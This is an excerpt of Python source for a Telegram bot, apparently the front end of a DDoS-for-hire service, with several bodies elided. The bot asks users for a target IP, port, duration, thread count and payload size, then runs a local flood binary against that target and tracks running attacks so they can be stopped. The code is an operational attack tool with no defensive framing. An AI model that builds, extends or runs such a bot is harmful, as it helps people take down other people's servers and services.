...
# In-memory storage
user_attack_details = {}  # Stores (target_ip, target_port, duration, threads, payload_size)
active_attacks = {}  # Stores (target_ip, target_port) -> PID

def run_attack_command_sync(target_ip, target_port, duration, threads, payload_size, action):
    if action == 1:
        try:
            # Build command with optional threads and payload_size
            cmd = ["./MasterBhaiyaa", target_ip, str(target_port), str(duration)]
...
def attack_command(message):
    ...
    bot.send_message(chat_id, "*Please provide target IP, port, time (seconds), and optional threads and payload size (bytes) separated by spaces.*\nExample: 192.168.1.1 8080 10 [threads] [payload_size]", parse_mode='Markdown')
...
def process_attack_ip_port(message):
    try:
        ...
        if len(args) < 3 or len(args) > 5:
            bot.send_message(message.chat.id, "*Invalid format. Use: <IP> <port> <time> [threads] [payload_size]*", parse_mode='Markdown')
            return

        target_ip = args[0]
        target_port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) >= 4 else None
        payload_size = int(args[4]) if len(args) == 5 else None
        ...
        if duration <= 0 or (threads is not None and threads <= 0) or (payload_size is not None and payload_size <= 0):
            bot.send_message(message.chat.id, "*Time, threads, and payload_size must be positive.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port, duration, threads, payload_size)
        send_main_buttons(message)
    except ValueError:
        bot.send_message(message.chat.id, "*Invalid port, time, threads, or payload_size.*", parse_mode='Markdown')
    except Exception as e:
...
def start_attack(message):
    ...
    if attack_details:
        ...
        run_attack_command_sync(target_ip, target_port, duration, threads, payload_size, 1)
...
def stop_attack(message):
    ...
    if attack_details:
        ...
        run_attack_command_sync(target_ip, target_port, 0, None, None, 2)
